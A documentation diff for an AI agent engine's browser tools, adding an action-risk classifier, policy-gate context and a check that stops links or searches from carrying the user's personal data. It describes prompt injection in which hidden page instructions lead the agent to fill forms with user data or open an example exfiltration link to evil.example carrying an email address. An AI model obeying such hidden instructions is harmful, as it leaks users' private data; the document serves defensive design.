@@ -104,8 +104,9 @@ interface BrowserPort {
   // options: highlight outlines a ref (approvals); jpeg saves a smaller file.
   screenshot(userId, profile, signal, options?: { highlight?: string; jpeg?: boolean }): Promise<{ path: string }>;
   currentUrl(userId, profile): Promise<string | null>;
-  // Optional: what a ref is, so approvals can name it ("Sign in", a button). null when it is gone.
-  element?(userId, profile, ref): Promise<{ role: string; label: string; password: boolean } | null>;
+  // Optional: what a ref is ("Sign in", a button), so approvals can name it and the risk of an action can be told.
+  // ref "focus": the focused element (where a key press goes). null when it is gone.
+  element?(userId, profile, ref): Promise<BrowserElement | null>;
   close(userId, profile): Promise<void>;
   // Optional: a page read in a tab of its own and closed, so parallel reads share no profile and start no extra browser.
   read?(userId, url, signal): Promise<BrowserPage>;
@@ -134,12 +135,20 @@ interface BrowserPage { url: string; title: string; snapshot: string }
 
 ### Who decides what the agent may do
 
-Reading (`open`, `snapshot`, `scroll`, `back`, `screenshot`, `close`) always runs. Acting (`click`, `type`, `press`)
-goes through a **gate** (see [Tools](tools.md#the-tool-fields)) that asks your policy about the page it would happen on:
+Reading (`open`, `snapshot`, `scroll`, `back`, `screenshot`, `close`) always runs, unless the URL carries the user's
+personal data ([below](#links-that-carry-the-users-data)). Acting (`click`, `type`, `press`) goes through a **gate**
+(see [Tools](tools.md#the-tool-fields)) that asks your policy about the page it would happen on, with the element acted
+on and the engine's reading of how risky the action is:
 
 ```ts
-type BrowserPolicy = (userId: string, url: string, action: 'click' | 'type' | 'press' | ...) =>
-  Promise<'allow' | 'approve' | { block: string }>;
+type BrowserPolicy = (
+  userId: string,
+  url: string,
+  action: 'click' | 'type' | 'press' | ...,
+  context?: { element: BrowserElement | null; risk: ActionRisk },
+) => Promise<'allow' | 'approve' | { block: string }>;
+
+interface ActionRisk { level: 'routine' | 'sensitive'; reason: string } // reason: "sends the form", "a password field"...
 ```
 
 | Policy answer | Chat run | Scheduled run |
@@ -149,8 +158,83 @@ type BrowserPolicy = (userId: string, url: string, action: 'click' | 'type' | 'p
 | `{ block }` | refused with your message | refused |
 | no policy given | every action asks | refused |
 
-StudyHawk, for example, allows actions on domains the user marked as trusted, asks everywhere else, and blocks every
-action on the school's Canvas (the app is read-only there; it reads Canvas through its API tools).
+StudyHawk, for example, allows every action on domains the user marked as trusted, blocks every action on the school's
+Canvas (the app is read-only there; it reads Canvas through its API tools), and elsewhere lets routine actions run and
+asks only for sensitive ones (or for every action, if the user chose that in its settings).
+
+### Routine or sensitive: browserActionRisk
+
+`browserActionRisk(action, element)` is how the engine reads an action. The gate calls it and passes the result to
+your policy as `context.risk`; you can call it yourself too.
+
+| Routine | Sensitive |
+|---|---|
+| Links, menus, tabs, "Next", "Show more" | Typing into a password or payment field (card number, CVV, `autocomplete="cc-*"`) |
+| Typing into an ordinary field (email, name, a message) | Sending a form: clicking its submit button, `type` with `submit: true`, or Enter in it |
+| Searching (a search box or a search form, Enter or its button) | A button whose name commits something: Send, Submit, Post, Reply, Share, Pay, Buy, Order, Checkout, Delete, Remove, Cancel, Unsubscribe, Transfer, Accept, Agree, Allow, Confirm, Sign up, Register, Apply, Upload, Log in, Sign in (and the Spanish words for them) |
+| Keys that send nothing (arrows, Tab, Escape), scrolling, going back | An element the host could not describe (no `element`, or it returned null) |
+
+Typing is never what sends data: the form is sent by a click or Enter, and that is the step that asks. Its approval
+shows **what the form would send** (`details.sends`: each filled field with its label, passwords as dots), so if a
+page's hidden instructions got the agent to put the user's data in a form, the user sees it before it leaves.
+
+The reading needs a good `element`. The more of these optional fields your `BrowserPort.element` fills, the fewer
+actions fall back to "sensitive":
+
+```ts
+interface BrowserElement {
+  role: string;             // button, link, textbox...
+  label: string;
+  password: boolean;
+  field?: 'password' | 'payment' | 'email' | 'search' | 'text' | 'other';
+  link?: boolean;           // goes to another page
+  submits?: boolean;        // a click (or Enter, for a field) sends its form
+  form?: {                  // the form it is in
+    search: boolean;        // a search form
+    password: boolean;
+    payment: boolean;
+    fields: { label: string; value: string }[]; // filled fields, passwords as dots: shown in the approval
+  };
+}
+```
+
+StudyHawk's sandbox runner reads all of it in the page (`elementInfo` in `sandbox/runner/snapshot.mjs`).
+
+A policy that asks only for what matters:
+
+```ts
+const browserPolicy: BrowserPolicy = async (userId, url, action, context) => {
+  if (isBlocked(url)) return { block: 'This app never acts on that site.' };
+  if (await isTrusted(userId, url)) return 'allow';
+  return context?.risk.level === 'routine' ? 'allow' : 'approve'; // no context: ask
+};
+```
+
+In scheduled runs and helpers nobody can approve, so with this policy routine actions run there and sensitive ones are
+refused, with the reason, so the agent can tell the user what it would have done.
+
+### Links that carry the user's data
+
+A page can hide instructions that ask the agent to "open" a link with the user's data in it
+(`https://evil.example/c?u=ana@uni.edu`): the data leaves with the request, with no form and no click. Pass
+`EngineOptions.personalData` and the engine checks every URL the agent opens or reads and every search it makes:
+
+```ts
+const engine = createEngine({
+  // ...
+  personalData: async (userId) => [user.email, user.schoolLogin, user.fullName], // values under 4 characters are ignored
+});
+```
+
+`browser_open`, `web_fetch`, `web_download` and `web_search` then ask the user first when the URL or query carries one
+of those values, as it is, URL-encoded or in base64. The approval says what it carries ("Open evil.example/c: the link
+carries your email address"). Where nobody can approve (scheduled runs, helpers) the call is refused. Without
+`personalData` nothing is checked. `findPersonalData(text, values)` and `personalDataGate(ctx, text, what)` are
+exported for tools of your own that send things out.
+
+Choose the values with care: a first name alone or a short username matches everywhere and makes the agent ask for
+ordinary searches. StudyHawk passes the account and school emails, their local parts of 6 characters or more, the
+logins, and the full name.
 
 All browser tools are main-agent-only: subagents cannot drive the user's logged-in browser.
 
